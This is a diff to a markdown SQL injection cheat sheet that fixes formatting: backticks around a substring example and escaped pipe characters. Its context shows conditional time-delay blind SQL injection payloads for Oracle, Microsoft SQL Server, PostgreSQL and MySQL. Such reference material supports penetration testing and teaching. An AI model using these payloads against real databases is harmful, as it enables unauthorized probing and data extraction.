@@ -108,7 +108,7 @@ PostgreSQL 12.15 (Ubuntu 12.15-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compile
 #
 
 ## Substring
-*You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.*
+*You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ``ba``.*
 
 | Type | String |
 | --- | --- |
@@ -263,7 +263,7 @@ MyDatabase     dbo           Users       Password     varchar
 
 | Type | String |
 | --- | --- |
-| Oracle   | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual `|
+| Oracle   | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual `|
 | Microsoft |  ` IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' ` |
 | PostgreSQL | ` SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END `|
 | MySQL | ` SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') `| 
